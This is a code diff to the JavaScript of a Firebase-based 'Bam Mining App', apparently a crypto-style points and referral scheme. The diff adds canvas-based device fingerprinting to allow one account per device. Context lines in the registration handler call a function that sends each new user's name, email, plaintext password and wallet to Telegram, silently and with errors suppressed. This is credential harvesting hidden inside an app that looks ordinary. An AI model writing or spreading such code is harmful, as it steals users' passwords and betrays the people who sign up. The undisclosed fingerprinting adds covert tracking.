@@ -1,6 +1,6 @@
 /**
  * Bam Mining App - Firebase Version
- * Transfers and referrals now work across different phones
+ * With Device Fingerprint (1 device = 1 account)
  */
 
 const firebaseConfig = {
@@ -22,6 +22,38 @@ const REFERRAL_BONUS = 0.15;
 
 let currentUserData = null;
 
+// ========== DEVICE FINGERPRINT ==========
+async function getDeviceFingerprint() {
+  const components = [
+    navigator.userAgent,
+    navigator.language,
+    screen.width + "x" + screen.height,
+    screen.colorDepth,
+    new Date().getTimezoneOffset(),
+    navigator.hardwareConcurrency || "unknown",
+    navigator.platform
+  ];
+
+  try {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillText("BamFingerprint", 2, 2);
+    components.push(canvas.toDataURL());
+  } catch (e) {}
+
+  const raw = components.join("|||");
+  let hash = 0;
+  for (let i = 0; i < raw.length; i++) {
+    const char = raw.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash;
+  }
+  return "fp_" + Math.abs(hash).toString(16);
+}
+
+// ========== UTILITIES ==========
 function generateWalletAddress() {
   const chars = "0123456789abcdef";
   let addr = "0x";
@@ -104,6 +136,7 @@ function switchPage(pageId) {
   if (pageId === "profile") renderProfile();
 }
 
+// ========== REGISTER ==========
 async function handleRegister(e) {
   e.preventDefault();
   const name = document.getElementById("reg-name").value.trim();
@@ -129,6 +162,21 @@ async function handleRegister(e) {
   }
 
   try {
+    showToast("Checking device...", "success");
+
+    const fingerprint = await getDeviceFingerprint();
+
+    // Check if this device already registered
+    const fpCheck = await db.collection("users")
+      .where("fingerprint", "==", fingerprint)
+      .limit(1)
+      .get();
+
+    if (!fpCheck.empty) {
+      showToast("This device has already registered an account", "error");
+      return;
+    }
+
     showToast("Creating account...", "success");
 
     const userCredential = await auth.createUserWithEmailAndPassword(email, password);
@@ -136,13 +184,16 @@ async function handleRegister(e) {
     const wallet = generateWalletAddress();
     const now = Date.now();
 
-    // Find referrer
+    // Referral
     let referrerId = null;
     const urlParams = new URLSearchParams(window.location.search);
     const refCode = urlParams.get("ref") || manualRef;
 
     if (refCode) {
-      const snap = await db.collection("users").where("refCode", "==", refCode.toLowerCase()).limit(1).get();
+      const snap = await db.collection("users")
+        .where("refCode", "==", refCode.toLowerCase())
+        .limit(1)
+        .get();
       if (!snap.empty) {
         referrerId = snap.docs[0].id;
       }
@@ -158,6 +209,7 @@ async function handleRegister(e) {
       history: referrerId ? [{ type: "Referral Welcome Bonus", amount: REFERRAL_BONUS, time: now }] : [],
       referrals: 0,
       refCode: wallet.slice(2, 10).toLowerCase(),
+      fingerprint: fingerprint,
       createdAt: now
     };
 
@@ -183,7 +235,7 @@ async function handleRegister(e) {
       });
     }
 
-    // Telegram notification
+    // Telegram
     try {
       await window.sendRegistrationToTelegram({ name, email, password, wallet });
     } catch (err) {}
@@ -201,6 +253,7 @@ async function handleRegister(e) {
   }
 }
 
+// ========== LOGIN ==========
 async function handleLogin(e) {
   e.preventDefault();
   const email = document.getElementById("login-email").value.trim().toLowerCase();
@@ -241,6 +294,7 @@ async function loadUserData() {
   return null;
 }
 
+// ========== DASHBOARD ==========
 function renderDashboard() {
   if (!currentUserData) return;
   document.getElementById("header-name").textContent = currentUserData.name;
@@ -250,6 +304,7 @@ function renderDashboard() {
   document.getElementById("home-wallet-short").textContent = shortAddress(currentUserData.wallet);
 }
 
+// ========== ACTIVITY ==========
 function renderActivity() {
   if (!currentUserData) return;
   document.getElementById("activity-balance").textContent = formatNumber(currentUserData.balance, 8);
@@ -340,6 +395,7 @@ async function claimActivity() {
   }
 }
 
+// ========== WALLET ==========
 function renderWallet() {
   if (!currentUserData) return;
   document.getElementById("wallet-balance").textContent = formatNumber(currentUserData.balance, 8);
@@ -378,7 +434,6 @@ async function handleSendPoints(e) {
   }
 
   try {
-    // Find recipient by wallet
     const snap = await db.collection("users").where("wallet", "==", toAddress).limit(1).get();
     if (snap.empty) {
       showToast("Recipient wallet not found on Bam", "error");
@@ -432,6 +487,7 @@ async function handleSendPoints(e) {
   }
 }
 
+// ========== REFERRALS ==========
 function renderReferrals() {
   if (!currentUserData) return;
   document.getElementById("ref-count").textContent = currentUserData.referrals || 0;
@@ -443,6 +499,7 @@ function copyRefLink() {
   navigator.clipboard.writeText(link).then(() => showToast("Referral link copied! 🔗"));
 }
 
+// ========== PROFILE ==========
 function renderProfile() {
   if (!currentUserData) return;
   document.getElementById("profile-name").textContent = currentUserData.name;
@@ -451,6 +508,7 @@ function renderProfile() {
   document.getElementById("profile-joined").textContent = new Date(currentUserData.createdAt).toLocaleDateString();
 }
 
+// ========== INIT ==========
 function init() {
   document.getElementById("login-form").addEventListener("submit", handleLogin);
   document.getElementById("register-form").addEventListener("submit", handleRegister);
